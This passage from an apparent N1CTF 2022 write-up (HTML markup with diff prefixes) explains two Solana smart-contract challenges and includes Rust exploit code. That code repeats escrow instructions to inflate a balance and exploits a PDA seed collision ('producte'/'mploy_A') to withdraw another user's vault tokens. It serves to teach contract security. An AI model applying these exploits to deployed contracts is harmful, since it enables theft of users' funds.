+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span>: <span class="nc">ServiceInstruction</span>::<span class="n">DepositEscrow</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">amount</span>: <span class="mi">10_</span><span class="k">u16</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">try_to_vec</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">unwrap</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reserve</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sys_prog_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">Instruction</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">program_id</span>: <span class="o">*</span><span class="n">utility_program</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">accounts</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span>: <span class="nc">ServiceInstruction</span>::<span class="n">Pay</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">amount</span>: <span class="mi">11_</span><span class="k">u16</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">try_to_vec</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">unwrap</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reserve</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sys_prog_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">Instruction</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">program_id</span>: <span class="o">*</span><span class="n">utility_program</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">accounts</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span>: <span class="nc">ServiceInstruction</span>::<span class="n">WithdrawEscrow</span><span class="w"> </span><span class="p">{}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">try_to_vec</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">unwrap</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reserve</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sys_prog_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>The only thing left to do is to change the host IP and port in <code>solve.py</code> and run it to retrieve the flag from the server. The result shows that <code>user</code>&rsquo;s balance went from 50 to 65570, and thus gives us the flag:</p>
+<pre tabindex="0"><code>n1ctf{cashback_9dejko3vrpaxq8gsy6iu}
+</code></pre><h2 id="n1ctf-2022---simple-staking">N1CTF 2022 - Simple Staking</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li><strong>Given file:</strong> <a href="/posts/20221128-n1ctf2022-writeups/Simple_Staking.tar.gz" rel="">Simple_Staking.tar.gz</a>.</li>
+<li><strong>Language:</strong> Anchor Framework</li>
+<li><strong>Bug type:</strong> PDA seed collision</li>
+</ul>
+</div>
+        </div>
+    </div>
+<h3 id="given-files-1">Given files</h3>
+<p>Different from the last challenge, this challenge is written with Anchor Framework instead of just vanilla Rust. Anchor is said to be safer and less error-prone, but it doesn&rsquo;t mean that it&rsquo;s bug-free. We are also given a bunch of files, but only some of them are important to us:</p>
+<ul>
+<li><code>framework/chall/program/chall/src/lib.rs</code>: the implementation of the target contract.</li>
+<li><code>framework/chall/src/main.rs</code>: the implementation of the initializations on the server using <a href="https://github.com/otter-sec/sol-ctf-framework" target="_blank" rel="noopener noreffer">Solana CTF Framework</a>.</li>
+<li><code>framework-solve/solve/program/solve/src/lib.rs</code> and <code>framework-solve/solve/src/main.rs</code>: the implementaion of our exploit contract and the invocation of it.</li>
+</ul>
+<h3 id="the-target-contract-functionalities-1">The target contract functionalities</h3>
+<p>I don&rsquo;t really understand what &ldquo;staking&rdquo; means in this context, but it doesn&rsquo;t really matter. The contract implements 3 instructions: <code>Register</code>, <code>Deposit</code> and <code>Withdraw</code>.</p>
+<p>The <code>Register</code> instruction takes 2 arguments <code>org_name</code>, <code>employee_id</code>, and some accounts, most notably <code>catalog</code>, <code>employee_record</code> and <code>user</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[account]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[repr(C, align(8))]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(Default)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Catalog</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">orgs</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">ids</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[account]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[repr(C, align(8))]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(Default)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">EmployeeRecord</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">org</span>: <span class="nb">String</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">id</span>: <span class="nb">String</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">key</span>: <span class="nc">Pubkey</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>It first checks if <code>org_name</code> and <code>employee_id</code> are already in <code>catalog</code> or not. If that&rsquo;s not the case, it will add them to it and then populate the fields of <code>employee_record</code>. Therefore, this intruction is basically used to register a user into the system using their organization name and employee ID.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">employee_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">employee_record</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org_name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">employee_record</span><span class="p">.</span><span class="n">id</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">employee_id</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">employee_record</span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">employee_key</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>The <code>Deposit</code> and <code>Withdraw</code> instructions take 3 arguments <code>org_name</code>, <code>employee_id</code>, <code>amount</code> and some notable accounts <code>vault</code>, <code>employee_record</code>, <code>reserve</code>, <code>user_token_account</code>, and <code>mint</code>. Different from the last challenge, this contract operates on tokens instead of lamports. Each user will have their own ATA for this token called <code>user_token_account</code>, and a <code>vault</code> account which is a PDA to keep track of their token balance on the contract. There are a lot of checks to be made before a deposit or withdraw transaction can take place.</p>
+<p>First of all, the user invoking the instruction must have been registered to the system:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">require</span><span class="o">!</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">employee_record</span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">org_name</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">employee_record</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">employee_id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">employee_record</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">CoreError</span>::<span class="n">UnknownEmployee</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>For <code>Withdraw</code>, the amount must also be a sane value:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">require</span><span class="o">!</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">vault</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">amount</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">CoreError</span>::<span class="n">InsufficientBalance</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>Secondly, the <code>vault</code> account must use the invoking user&rsquo;s <code>org_name</code> and <code>employee_id</code> as seeds:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[account(
+</span></span></span><span class="line"><span class="cl"><span class="cp">    init_if_needed,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    seeds = [org_name.as_bytes(), employee_id.as_bytes()],
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bump,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    space = Vault::SIZE,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    payer = user 
+</span></span></span><span class="line"><span class="cl"><span class="cp">)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="n">vault</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">Vault</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span></code></pre></div><p>Thirdly, the <code>employee_record</code> account must belong to the invoking user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[account(
+</span></span></span><span class="line"><span class="cl"><span class="cp">    seeds = [user.key().as_ref()],
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bump,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = employee_record.org == org_name,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = employee_record.id == employee_id,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = employee_record.key == user.key(),
+</span></span></span><span class="line"><span class="cl"><span class="cp">)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="n">employee_record</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">EmployeeRecord</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span></code></pre></div><p>Next, the <code>reserve</code> account and the <code>user_token_account</code> must be for correct <code>mint</code> token account:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[account(
+</span></span></span><span class="line"><span class="cl"><span class="cp">    mut,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    seeds = [ b</span><span class="s">&#34;RESERVE&#34;</span><span class="cp"> ],
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bump,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = reserve.mint == mint.key(),
+</span></span></span><span class="line"><span class="cl"><span class="cp">)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="n">reserve</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">TokenAccount</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[account(
+</span></span></span><span class="line"><span class="cl"><span class="cp">    mut,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = user_token_account.owner == user.key(),
+</span></span></span><span class="line"><span class="cl"><span class="cp">    constraint = user_token_account.mint  == mint.key()
+</span></span></span><span class="line"><span class="cl"><span class="cp">)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="n">user_token_account</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">TokenAccount</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span></code></pre></div><p>And finally, the user must be the signer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="n">user</span>: <span class="nc">Signer</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span></code></pre></div><p>With all those constraints, forging a fake token and ATA, forging a fake <code>employee_record</code>, or using another user&rsquo;s <code>vault</code> are all invalid strategies. The vulnerability is not so obvious here, so let&rsquo;s take a look at the server initialization program to see what we can do next.</p>
+<h3 id="the-server-program-1">The server program</h3>
+<p>The program itself is pretty long, but here are some important things that it does:</p>
+<ol>
+<li>Create a mint account</li>
+<li>Initialize the target contract</li>
+<li>Register a user with <code>org_name = &quot;product&quot;</code> and <code>employee_id = &quot;employ_A&quot;</code></li>
+<li>Mint 1000 tokens to this user</li>
+<li>Create a vault PDA for this user</li>
+<li>Deposit 500 tokens to this user&rsquo;s vault account</li>
+<li>Give the player 100 tokens</li>
+<li>Run our exploit contract</li>
+<li>Check if the player has more than 100 tokens, if so then prints the flag</li>
+</ol>
+<p>So it&rsquo;s clear that the goal here is to steal tokens from <code>employ_A</code>&rsquo;s vault.</p>
+<h3 id="the-vulnerability-1">The vulnerability</h3>
+<p>Recall that when registering a user, it&rsquo;s entirely up to the user to choose their <code>org_name</code> and <code>employee_id</code>, as long as they are not already in the <code>catalog</code>. This is important because the seeds to generate the user&rsquo;s <code>vault</code> PDA are exactly those 2 values:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[account(
+</span></span></span><span class="line"><span class="cl"><span class="cp">    init_if_needed,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    seeds = [org_name.as_bytes(), employee_id.as_bytes()],
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bump,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    space = Vault::SIZE,
+</span></span></span><span class="line"><span class="cl"><span class="cp">    payer = user 
+</span></span></span><span class="line"><span class="cl"><span class="cp">)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="n">vault</span>: <span class="nc">Account</span><span class="o">&lt;&#39;</span><span class="na">info</span><span class="p">,</span><span class="w"> </span><span class="n">Vault</span><span class="o">&gt;</span><span class="p">,</span><span class="w">
+</span></span></span></code></pre></div><p>As we can see, those 2 values are simply concatenated together to form the seed. So for example in case of employee A, their seed will be <code>productemploy_A</code>.</p>
+<p>So what if we can somehow register a user that has the same seed as employee A? In that case, we can use employee A&rsquo;s <code>vault</code> as our own, and basically can withdraw anything from their vault. This is easy to do thanks to how the seeds are designed. If we create a user with <code>org_name = &quot;producte&quot;</code> and <code>employee_id = &quot;mploy_A&quot;</code>, it will pass all the checks because these values are not in the <code>catalog</code> yet, and our <code>vault</code> PDA&rsquo;s seeds will still be <code>productemploy_A</code>. And that is basically our strategy to exploit this contract.</p>
+<h3 id="the-exploit-contract-1">The exploit contract</h3>
+<p>Although the vulnerability is very sneaky, the exploit is very easy to implement.</p>
+<p>First of all, I changed the <code>vault</code> PDA&rsquo;s seeds in <code>framework-solve/solve/src/main.rs</code> from <code>&amp;[b&quot;product&quot;, b&quot;employ_B&quot;]</code> to <code>&amp;[b&quot;producte&quot;, b&quot;mploy_A&quot;]</code>. I also changed the host IP and port to be the challenge&rsquo;s server.</p>
+<p>The same goes for <code>o1</code> and <code>e1</code> in <code>framework-solve/solve/program/solve/src/lib.rs</code>, I also changed them to <code>producte</code> and <code>mploy_A</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;producte&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;mploy_A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>The invocation to the <code>Register</code> instruction is already written for us, so by changing these names, I will have a user with <code>org_name = &quot;producte&quot;</code> and <code>employee_id = &quot;mploy_A&quot;</code> registered.</p>
+<p>Then, the only thing left to do is to invoke <code>Withdraw</code> to steal tokens from employee A&rsquo;s <code>vault</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">o2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;producte&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">e2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;mploy_A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">accounts</span>::<span class="n">Withdraw</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">vault</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">vault</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">employee_record</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_record</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reserve</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_account</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_token_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mint</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">payer</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">system_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">system_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rent</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">rent</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
